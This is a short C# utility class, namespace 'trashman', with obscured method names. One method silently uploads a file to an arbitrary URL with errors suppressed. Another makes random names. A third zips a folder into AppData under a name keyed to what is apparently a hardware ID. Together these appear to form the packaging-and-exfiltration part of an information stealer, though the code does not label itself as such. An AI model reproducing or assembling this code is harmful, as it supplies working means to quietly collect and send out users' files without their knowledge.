using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace trashman
{
    public static class trash
    {

        public static void s3nder(string url, string path)
        {
            try
            {
                new WebClient().UploadFile(url, "POST", path);
            }
            catch
            {

            }
        }
        public static string rndname(int length)
        {
            try
            {
                Random rnd = new Random();
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[rnd.Next(s.Length)]).ToArray());
            }
            catch
            {
                return null;
            }
        }

        public static void Zip(string hwd, string dllpath, string defpath)
        {
            Assembly asm = Assembly.LoadFrom(dllpath + @"/ICSharpCode.SharpZipLib.dll");
            Type type = asm.GetType("ICSharpCode.SharpZipLib.Zip.FastZip");
            var act = Activator.CreateInstance(type);
            Type[] paramss = { typeof(string), typeof(string), typeof(bool), typeof(string) };
            MethodInfo method = type.GetMethod("CreateZip", paramss);
            object[] mtparams = { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/" + hwd + ".zip", defpath, true, "" };
            method.Invoke(act, mtparams);
        }
    }
}
